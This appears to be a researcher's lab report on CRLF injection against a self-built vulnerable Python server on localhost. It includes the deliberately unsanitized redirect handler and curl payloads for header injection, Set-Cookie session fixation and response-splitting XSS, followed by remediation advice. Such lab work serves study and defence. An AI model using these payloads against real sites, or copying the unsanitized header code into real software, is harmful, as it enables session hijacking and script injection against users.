# CRLF Injection — Lab Practice Report

> **Author:** CRUSH (Security Researcher)
> **Date:** 2026-10-23
> **Environment:** Local isolated lab (127.0.0.1)
> **Scope:** Self-built vulnerable server (educational purpose only)
> **Status:** ✅ Confirmed — Three attack scenarios reproduced

---

## 1. Executive Summary

This report documents a controlled, local lab environment used to study **CRLF Injection (Carriage Return Line Feed Injection)** and its real-world impact. Three distinct exploitation scenarios were successfully reproduced:

| # | Scenario | Impact | Status |
|---|----------|--------|--------|
| 1 | HTTP Header Injection | Arbitrary header injection | ✅ Confirmed |
| 2 | Session Fixation via `Set-Cookie` | Cookie manipulation | ✅ Confirmed |
| 3 | HTTP Response Splitting → XSS | Script execution in victim context | ✅ Confirmed |

The lab intentionally uses a **raw HTTP server** (`http.server`) to demonstrate the vulnerability, and contrasts it with a **modern framework** (`Flask` / `Werkzeug`) that blocks CRLF injection by default.

---

## 2. Background: What is CRLF Injection?

HTTP/1.1 uses the sequence `\r\n` (CRLF) to delimit headers and separate headers from the response body. If an application reflects user-controlled input into an HTTP header without sanitizing `\r` and `\n`, an attacker can:

- **Inject new headers** (e.g., `Set-Cookie`, `Location`)
- **Terminate the header section early** and inject a custom response body
- **Split the HTTP response** into two parts (HTTP Response Splitting)

This can lead to **session fixation, cache poisoning, XSS, and account takeover**.

---

## 3. Lab Setup

### 3.1 Vulnerable Server (Raw)

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if parsed.path == '/redirect':
            url = params.get('url', ['/'])[0]
            self.send_response(302)
            self.send_header('Location', url)   # ← no sanitization
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h1>Raw CRLF Lab</h1>')

if __name__ == '__main__':

HTTPServer(('127.0.0.1', 5001), VulnerableHandler).serve_forever() 

Why this is vulnerable: send_header() in http.server performs no validation on the header value. Any \r\n in the value is written verbatim to the wire.
3.2 Protected Server (Flask / Werkzeug)

The same logic implemented in Flask raises:
text

ValueError: Header values must not contain newline characters.

This demonstrates that modern frameworks already defend against CRLF injection at the framework level.
4. Exploitation Walkthrough
4.1 Baseline — Normal Behavior
bash

curl -i "http://127.0.0.1:5001/redirect?url=https://example.com"

Response:
text

HTTP/1.0 302 Found
Location: https://example.com

Expected behavior. No injection.
4.2 Scenario 1 — Arbitrary Header Injection
bash

curl --raw -i "http://127.0.0.1:5001/redirect?url=https://example.com%0d%0aX-CRLF-Test:%20Injected"

Result: The server emitted a new header X-CRLF-Test: Injected into the response. Confirmed injection of arbitrary headers.

Note: curl reports Header without colon because it fails to parse the malformed header value — 
this is itself proof that the injection reached the wire.
4.3 Scenario 2 — Session Fixation via Set-Cookie
bash

curl --raw -i "http://127.0.0.1:5001/redirect?url=https://example.com%0d%0aSet-Cookie:%20session=malicious"

Result: The response contained:
text

Set-Cookie: session=malicious

Impact: An attacker can force an arbitrary cookie onto a victim’s browser. Combined with weak session handling,
this enables Session Fixation and, in some chains, Account Takeover.
4.4 Scenario 3 — Response Splitting → XSS
bash

curl --raw -i "http://127.0.0.1:5001/redirect?url=https://example.com%0d%0a%0d%0a<html><body><script>alert(1)</script></body></html>"

Result:
text

HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.13.3
Date: Fri, 23 Oct 2026 08:32:26 GMT
Location: https://example.com

<html><body><script>alert(1)</script></body></html>

Impact: The attacker has fully terminated the header block and injected an arbitrary HTML/JavaScript body.
Any client that renders the response executes attacker-controlled JavaScript in the origin’s context — a stored/reflected XSS primitive,
depending on where the URL is used.

5. Impact Assessment

   Scenario	                         Real-World Impact	                 Severity (CVSS 3.1)
Header Injection	        Malformed responses, cache poisoning	            Medium
Session Fixation	             Account takeover (chained)	                     High
Response Splitting → XSS	Script execution in victim context, data theft	  High–Critical


In a production target, CRLF injection into a redirect endpoint often chains into:

    Cache Poisoning: attacker poisons a shared cache with a malicious response.
    XSS via Response Splitting: persistent script execution for any user who visits the poisoned URL.
    Session Hijacking: cookie injection + weak session logic = ATO.

6. Root Cause
The vulnerability exists because the application reflects user input into an HTTP header without sanitizing CR/LF characters.
python

url = params.get('url', ['/'])[0]
self.send_header('Location', url)   # ← root cause

http.server does not reject \r or \n in header values. In contrast, Werkzeug explicitly raises:
python

if _newline_re.search(value) is not None:
    raise ValueError("Header values must not contain newline characters.")


7. Remediation

7.1 For Developers
    Reject any input containing \r or \n before it reaches a header.

    Encode header values using a strict allowlist (e.g., RFC 3986 for URLs).

    Use modern frameworks (Flask ≥ 2.x / Werkzeug ≥ 2.x) that enforce this by default.

    Validate redirect targets with an allowlist of permitted domains.

    Enforce Content-Security-Policy to mitigate XSS impact if a bypass is found.

7.2 For Reviewers / Bug Bounty Hunters
    Look for parameters reflected in Location, Set-Cookie, Content-Type, or custom headers.

    Test with %0d%0a payloads via curl --raw or Burp Repeater (never a browser).

    Confirm the injection using Set-Cookie (most reliable) before chaining further.


8. Lessons Learned
    Modern frameworks block CRLF by default. This is why real-world CRLF bugs increasingly require bypasses
    (e.g., encoding tricks, double-decoding, HTTP/2 pseudo-headers).

    Response Splitting is the most dangerous variant. Header injection alone is often considered low-impact,
    but splitting the response unlocks XSS and cache poisoning.

    curl --raw is essential. A browser filters \r\n; only a raw client reveals the true behavior.

    Lab-to-prod translation: The same payload that works on a raw server may be blocked by Werkzeug/Express/Django —
    always fingerprint the stack first.

9. References
    OWASP WSTG — Testing for HTTP Splitting/Smuggling (WSTG-INJT-15)

    OWASP Top 10 (2021) — A03: Injection

    CWE-93: Improper Neutralization of CRLF Sequences

    CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers

    PortSwigger Web Security Academy — HTTP Response Splitting

10. Disclaimer
    This lab was performed entirely in an isolated local environment on 127.0.0.1, using a self-authored vulnerable server.
    No production system, third-party service, or user data was involved.
    The content is published for educational and portfolio purposes only.

    "The best hunters do not just find bugs — they understand why they exist."
